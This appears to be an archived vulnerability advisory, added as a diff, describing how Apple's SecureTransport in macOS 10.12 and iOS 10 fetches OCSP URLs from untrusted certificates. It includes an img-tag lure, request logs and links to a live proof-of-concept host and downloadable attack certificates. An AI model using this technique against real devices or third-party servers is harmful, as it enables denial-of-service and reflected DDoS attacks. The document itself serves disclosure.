@@ -1,0 +1,72 @@
+id: 25993
+date: 10/23/2016
+title: Apple Mac OS X 10.12/iOS 10 SecureTransport SSL handshake OCSP MiTM and DoS
+author: Maksymilian Arciemowicz
+cves: 
+
+Apple macOS 10.12/iOS 10 SecureTransport SSL handshake OCSP MiTM and DoS
+
+--- 0. Description ----
+The latest macOS and iOS have weak OCSP validation process which allow attacker to send OCSP requests (up to 200k) in name of victim during MiTM attack.
+
+--- 1. MiTM and handshake OCSP verification ---
+Apple's SecureTransport trusts and checks OCSP URLs without verification of certificate authority, common name etc. Attacker is able to create self-sign certificate with huge list of OCSP URLs in order to trigger network traffic before inform user about untrusted certificate.
+
+Observed behaviors:
+CORRECT [ wget with openssl ]
+-------------------------------------
+$ wget https://abuse.cert.cx/pack.jpg
+--2016-09-24 20:04:21-- https://abuse.cert.cx/pack.jpg
+Resolving cert.cx... 198.27.126.246
+Connecting to abuse.cert.cx|198.27.126.246|:443... connected.
+ERROR: cannot verify abuse.cert.cx's certificate, issued by ‘CN=CXSECBBBB16248617,OU=CXSECRUITY.COM,O=CXSECRUITY.COM,ST=Poland,C=PL’:
+Self-signed certificate encountered.
+ERROR: no certificate subject alternative name matches
+requested host name ‘abuse.cert.cx’.
+To connect to abuse.cert.cx insecurely, use `--no-check-certificate'.
+-------------------------------------
+
+MiTM and OCSP with SecureTransport
+-------------------------------------
+$ curl https://abuse.cert.cx/pack.jpg -v
+* Trying 198.27.126.246...
+* Connected to abuse.cert.cx (198.27.126.246) port 44443 (#0)
+
+[ no timeout ]
+
+$ curl -V
+curl 7.49.1 (x86_64-apple-darwin16.0) libcurl/7.49.1 SecureTransport zlib/1.2.8
+Protocols: dict file ftp ftps gopher http https imap imaps ldap ldaps pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
+Features: AsynchDNS IPv6 Largefile GSS-API Kerberos SPNEGO NTLM NTLM_WB SSL libz UnixSockets
+-------------------------------------
+
+--- 2. DDoS and Resource Exhaustion ---
+Each handshake may trigger many OCSP requests (verified up to 200k) with GET method like this.
+
+macOS 10.12.1 User-Agent
+"GET /fake-ocsp.php HTTP/1.1" 200 1 "-" "trustd (unknown version) CFNetwork/807.0.4 Darwin/16.0.0 (x86_64)"
+
+MacOSX 10.11.6 User-Agent
+"GET /fake-ocsp.php HTTP/1.1" 200 1 "-" "ocspd/1.0.3"
+
+scenario of attack is trivial, the attacker send victim a link to some resource eg image through SSL like
+
+<img src="https://abuse.cert.cx/noexists.jpg">
+
+and OS's victim will perform a few thousands requests to OCSP URLs.
+
+Attack may be directed to third part resource so that many users unknowingly become part of a DDoS attack. One HTTPS request can trigger several thousand other HTTP
+
+Another scenario assumes extension of handshake time. Observed timeout of OCSP requests to 7 seconds. However, you can try to increase the size of the OCSP response. In order to consume network bandwidth.
+
+In the case of the iPhone, restart Safari will not stop defective handshake. Similarly, in macOS. It's recommend to restart device or disconnect from network until all OCSP requests will expire.
+
+--- 3. PoC ---
+live poc for macOS 10.12 Safari/curl
+https://abuse.cert.cx
+
+Download cerificates with 15k OCSP requests
+https://cert.cx/ssldos/crt.crt
+https://cert.cx/ssldos/key.key
+
+#  0day.today [2023-03-23]  #
